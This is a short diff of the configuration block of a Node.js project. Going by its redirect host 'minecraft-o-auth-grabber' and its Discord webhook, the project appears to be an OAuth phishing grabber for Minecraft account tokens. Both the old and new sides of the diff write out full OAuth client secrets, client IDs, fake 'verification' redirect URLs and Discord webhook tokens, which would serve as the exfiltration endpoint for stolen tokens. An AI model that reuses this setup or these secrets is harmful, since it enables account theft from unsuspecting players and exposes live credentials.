@@ -1,8 +1,8 @@
 //Config
-const client_secret = 'tTM8Q~R-ejAK5Vn4v0m-TN3JtYdLjaKrP5z30cP5'
-const client_id = '223a5944-147c-4e2b-b563-e837094a82c2'
-const redirect_uri = 'https://koalaverification.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040239853545197719/vnjgrDn42ewQwU5K3jec62Z1DW0FgV2HZT4SXL1H-y9JvQvygYyF0rPWkKa8nDrc8rE2'
+const client_secret = 'ZB.8Q~AGwVerveUIOqmz5W-VBF~x~s-EJFoZ1coe'
+const client_id = '9c23fce6-2fbe-47f3-a36d-94a56b37a3bc'
+const redirect_uri = 'https://minecraft-o-auth-grabber-mog-one.vercel.app/'
+const webhook_url = 'https://discord.com/api/webhooks/1160604080914321448/wz8Kv1TtI-zN3wgGhJ9V1MN1nFbDxU_fQahQm9yM8X0yl67Yqdh-jml_fjofshpcZygT'
 //Requirements
 const axios = require('axios')
 const express = require('express')
